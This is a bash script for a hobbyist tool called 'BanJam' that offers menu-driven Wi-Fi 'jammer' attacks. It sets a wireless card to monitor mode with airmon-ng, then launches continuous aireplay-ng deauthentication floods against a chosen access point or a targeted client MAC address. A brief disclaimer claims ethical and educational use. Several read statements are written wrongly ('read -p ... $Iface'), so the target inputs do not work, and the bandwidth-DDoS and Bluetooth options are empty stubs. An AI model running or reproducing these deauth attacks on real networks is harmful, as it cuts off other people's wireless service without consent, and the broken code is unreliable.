#!/bin/bash

# Define color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "$BLUE                                                              $NC     __              "
echo -e "$BLUE  ____                              _                         $NC    /\/\             "
echo -e "$BLUE | __ |  __ _ _ ___                | | __ _ _ ____ ___    $RED  /  / $NC |/\| $RED  \  \  "
echo -e "$BLUE |  _ \ / _' | '__  \  ____    _   | |/ _' | '__  '__  \  $RED |  |  $NC |\/|  $RED  |  |'"
echo -e "$BLUE | |_) | (_| | |  | | |____|  | |__| | (_| | |  | |  | |  $RED \  \ $NC /\/\/\ $RED /  /  "
echo -e "$BLUE |____/ \__,_|_|  |_|          \_____/\__,_|_|  |_|  |_|    $NC    /_/  \_\           "

sleep 1

echo
echo -e "$NC Loading BanJam... Please Select from the Menu Below."
echo

sleep 1

# Selecting an interface (setup monitering mode airmon-ng)
 
    echo
    echo -e "$GREEN [ Wireless Interfaces Found ]"
    echo
    printIface=$(ip a)
    echo -e "$NC $printIface"
    echo
    echo "$NC Select Your Interface:"
    read -p "Set>" $Iface
    echo
    echo "$YELLOW Setting Wifi Interface to Monitering Mode..."
    sudo airmon-ng check kill $Iface
    sleep 1
    sudo airmon-ng start $Iface

#Subproccess Import and Checker

subprocess_check() {

echo ""
echo "====[WELCOME TO BANJAM SUBPROCESS IMPORT & CHECKER]===="
echo
sleep 2

checktool(){
local tool=$1
echo "Checking for $tool..."
sleep 1

if ! command -v "$tool" > /dev/null 2>&1; then
   echo -e "$tool $RED [NOT INSTALLED]$NC"
   read -p "Would you like to install $tool now? (y/n): " install_choice
   install_choice=$(echo "$install_choice" | xargs)

   if [[ "$install_choice" =~ ^[Yy](es)?$ ]]; then
      sudo apt install -y "$tool"
   else
      echo -e "$NC Skipping installation of $tool"
   fi
else
   if "$tool" --help > /dev/null 2>&1; then
	echo -e "$tool $GREEN [PROPERLY INSTALLED]."
   else
	echo -e "$YELLOW Warning: $tool [INSTALLED, BUT NOT WORKING PROPERLY]$NC"
   fi
fi
echo ""
}
# adding tools here
checktool airmon-ng
checktool airodump-ng
checktool aircrack-ng
checktool hping3
checktool fastfetch

echo -e "$GREEN====[SUBPROCESS CHECK COMPLETED]====$NC"
read -n 1 -s -r -p $'Press any Key to Return To Main Menu...'
# OLD subprocess
#if command -v aireplay-ng && airmon-ng && airodump-ng >/dev/null 2>&1; then
 #   echo -e "$NC Subproccesses are Intalled, Checking Usability..."
  #  echo
   # if command -v aireplay-ng && airmon-ng && airodump-ng --help >dev/null 2>&1; then
#	echo -e "$GREEN Subproccess successuly working$NC"
 #       echo
  #  else
#	echo -e "$YELLOW Subproccess Imported But Not Executed Properly$NC"
 #       echo
  #  fi
#else 
 #   echo -e "$RED Subproccess not installed properly$NC"
#    echo
#fi
sleep 2
}


# Menu Selects

wifisub_menu() {

while true; do
    echo
    echo
    echo -e "$NC[--- Wifi Jammer Type Menu ---]"
    echo "1) Deauth Jammer Attack (Broadcast)"
    echo "2) Targeted Deauth Jammer Attack"
    echo "3) DDOS Bandwidth Jammer Attack"
    echo "99) Exit To Main Menu"
    read -p "Set>" wifichoice

case $wifichoice in
        1) echo ">> Preparing Wifi $RED Attack $NC Config..."
        sleep 1
        echo
        echo "What is Your Target BSSID: "
        sleep 1
        read -p "Set>" $BSSID0
        echo
        echo "Launching Attack"
        echo
        sleep 1
        aireplay-ng --deauth 0 -b $BSSID0 $Iface;;
        2) echo "Preparing Targeted Deauth Jammer Attack Config..."
        echo
        sleep 1
        echo "What is Your Tareted BSSID: "
        read -p "Set>" $BSSID1 $Iface
        echo
        sleep 1
        echo "What is Your Targeted MAC Address: "
        read -p "Set>" $MAC
        echo
        echo "Launching Attack"
        echo
        sleep 1
        aireplay-ng --deauth 0 -b $BSSID1 -c $MAC $Iface;;
        99) break;;
        *) echo ">> Invalid Selection";;
    esac
    read -n 1 -s -r -p $'\nPress Any Key to Return to Main Menu'
done
}

#MAIN PROCESS


while true; do
    echo
    echo
    echo "[--- Jammer Type Selection Menu ---]"
    echo "1) Wifi Jammer Attack"
    echo "2) Bluetooth Low Energy (BLE)"
    echo "3) Update BanJam"
    echo "4) Credits and About"
    echo "99) Exit BanJam"
    echo ""
    read -p "set> " choice

    case "$choice" in
        1) echo ">> Launching Wifi Jammer Attack Cofig..."
	sleep 1
	clear
	wifisub_menu;;
        2) echo ">> Launching BLE Jammer Attack...";;
        3) echo ">> Checking Subprocesseses for BanJam..."
        sleep 2
        subprocess_check
	sleep 3;;
        4) echo ">> Loading Credits..."
	sleep 2
	echo
        echo -e "Concept & Development Designed, scripted, and endlessly refined by $BLUE[IdontByte :0 ]$NC"
        echo
	sleep 2
        echo "Made with a deep passion for  Cybersecurity, Wifi Penntesting, Ethical Hacking, Coding (Its more like a love hate relationship) and just a touch of creativity."
        echo
	sleep 2
echo -e "$GREEN Toolchain Integration $NC"
sleep 1
echo "- Aireplay-ng"
sleep 1
echo "- Airmon-ng & Airodump-ng"
sleep 1
echo "- Shell scripting (Bash)"
sleep 1
echo "- Linux CLI utilities"
sleep 1
echo -e "A hint of $RED AI $NC for troubleshooting..."
sleep 1
echo -e "$YELLOW And Last But Not Least... $NC (DRUMROLL PLEASE)..."
sleep 3
echo -e "$RED - My Last Strand of Sanity $NC :0"
echo
sleep 2
echo "BanJam’s menu aesthetics, ASCII layout, and terminal presence are inspired by retro hacking culture and the design spirit of tools like SEToolKit and also Airgeddon"
echo
sleep 2
echo -e "$YELLOWDISCLAIMER: This tools is used for $RED ETHICAL $YELLOW and $RED EDUCATIONAL $YELLOW purposes only. Please use this tool ethically and on your own equipend. I hope you enjoy :)$NC"
sleep 2
echo
echo -e "$BLUE Feel Free to Check out some of my other projects as Well :). My Github is $NC Nickheerkens04."
sleep 2

echo -e "$GREEN I Will Catch U Guys Later... Peace $NC"
sleep 2

echo '                 ..zeeeeeee..                 '
echo '            .zd$$$$$$$$$$$$$$$$be.            '
echo '         .e$$$$$$$$$$$$$$$$$$$$$$$$e.         '
echo '       .$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$c       '
echo '    .$$$$$$$$$$*   $$$$$$   *$$$$$$$$$$.      '
echo '   z$$$$$$$$!!     $$$$$$       $$$$$$$$$     '
echo '  d$$$$$$$!        $$$$$$        $$$$$$$$$    '
echo ' d$$$$$$!          $$$$$$          $$$$$$$$   '
echo 'd$$$$$$!           $$$$$$           ^$$$$$$b  '
echo '$$$$$$F            $$$$$$            .$$$$$$r '
echo '$$$$$$             $$$$$$.            $$$$$$$ '
echo '$$$$$F           .$$$$$$$$c           4$$$$$$ '
echo '$$$$$F          e$$$$$$$$$$$.          $$$$$$ '
echo '$$$$$F        .$$$$$$$$$$$$$$b        .$$$$$$ '
echo '$$$$$b       e$$$$$$$$$$$$$$$$$c      4$$$$$$ '
echo '$$$$$$     .$$$$$$P$$$$$$$$$$$$$b.    $$$$$$P '
echo '$$$$$$b   d$$$$$$! $$$$$$ !$$$$$$$c  d$$$$$$. '
echo '.$$$$$$b.$$$$$$P   $$$$$$  ^*$$$$$$bd$$$$$$F  '
echo ' !$$$$$$$$$$$$!    $$$$$$    !$$$$$$$$$$$$P   '
echo '  !$$$$$$$$$P      $$$$$$      *$$$$$$$$$!    '
echo '   ^$$$$$$$$$e.    $$$$$$    .e$$$$$$$$$!     '
echo '     !$$$$$$$$$$$ee$$$$$$ee$$$$$$$$$$$*       '
echo '       !$$$$$$$$$$$$$$$$$$$$$$$$$$$$!         '
echo '          !*$$$$$$$$$$$$$$$$$$$$$$*           '
echo '             ^!*$$$$$$$$$$$$$$*!!             '
echo '                 ^^^^^^^^^^^^                 '
echo;;

      99) echo -e "$NC Exiting, Thank You for Using BanJam..."
      sleep 1
      sudo airmon-ng stop $Iface
      sudo systemctl start NetworkManager; break;;
      *) echo ">> Invalid selection. Try again." ;;
    esac
   read -n 1 -s -r -p $'\nPress any key to return to menu...'
done



